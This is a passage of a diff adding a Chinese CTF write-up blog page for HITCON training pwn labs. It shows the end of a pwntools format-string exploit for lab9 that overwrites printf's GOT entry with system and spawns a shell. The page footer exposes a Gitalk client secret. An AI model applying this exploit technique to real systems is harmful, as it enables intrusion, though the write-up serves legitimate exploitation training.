class="string">&quot;step1&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#step3 change 0x7 0xb with 0x39 0x3b</span></span><br><span class="line">payload = hn((elf.got[<span class="string">&#x27;printf&#x27;</span>])&amp;<span class="number">0xffff</span>,<span class="number">0x39</span>)</span><br><span class="line">payload += hn(<span class="number">2</span>,<span class="number">0x3b</span>)</span><br><span class="line">payload += <span class="string">&#x27;step3\x00&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;step2&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#step4 change got with 0x7 0xb</span></span><br><span class="line">payload = hhn(system_addr &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>,<span class="number">0xb</span>)</span><br><span class="line">payload += hn((system_addr&amp;<span class="number">0xffff</span>) - (system_addr &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>),<span class="number">0x7</span>)</span><br><span class="line">payload += <span class="string">&#x27;step4\x00&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;step3&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#step5 send /bin/sh</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;step4&#x27;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这题比较难，参考了好多题解做了梳理。</p>
+<p><em>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39268483/article/details/92848463">链接1</a>,<a target="_blank" rel="noopener" href="https://4f-kira.github.io/2018/07/11/hitcontraining/#lab9-playfmt">链接2</a></em></p>
+<h3 id="lab10"><a href="#lab10" class="headerlink" title="lab10"></a>lab10</h3><h3 id="lab11"><a href="#lab11" class="headerlink" title="lab11"></a>lab11</h3><h4 id="lab11-1"><a href="#lab11-1" class="headerlink" title="lab11 - 1"></a>lab11 - 1</h4><h4 id="lab11-2"><a href="#lab11-2" class="headerlink" title="lab11 - 2"></a>lab11 - 2</h4><h3 id="lab12"><a href="#lab12" class="headerlink" title="lab12"></a>lab12</h3><h3 id="lab13"><a href="#lab13" class="headerlink" title="lab13"></a>lab13</h3><h3 id="lab14"><a href="#lab14" class="headerlink" title="lab14"></a>lab14</h3><h3 id="lab15"><a href="#lab15" class="headerlink" title="lab15"></a>lab15</h3>
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/06/22/gitcmd/" rel="prev" title="git命令与使用">
+                  <i class="fa fa-chevron-left"></i> git命令与使用
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/07/17/archeap/" rel="next" title="论文阅读：Automatic Techniques to Systematically Discover New Heap Exploitation Primitives">
+                  论文阅读：Automatic Techniques to Systematically Discover New Heap Exploitation Primitives <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+  
+  
+  
+
+
+
+      
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+      
+
+      
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ma5ker</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">243k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">3:41</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1.6.2/dist/gitalk.css">
+
+<script>
+NexT.utils.loadComments('#gitalk-container', () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1.6.2/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : '0530768cd3819c29f055',
+      clientSecret: '9465920674abd65e54adf115c57771a78911b8f4',
+      repo        : 'blog-comments',
+      owner       : 'Ma5ker',
+      admin       : ['Ma5ker'],
+      id          : '395d20fa18fb0923e483ed84545a0de3',
+        language: '',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":85,"height":200,"hOffset":60,"vOffset":40},"mobile":{"show":true,"scale":0.3,"motion":true},"neat_enable":true,"neat_html":{"enable":true,"exclude":null},"neat_css":{"enable":true,"exclude":["**/*.min.css"]},"neat_js":{"enable":true,"mangle":true,"output":null,"compress":null,"exclude":["**/*.min.js","**/jquery.fancybox.pack.js","**/index.js","**/love.js"]},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
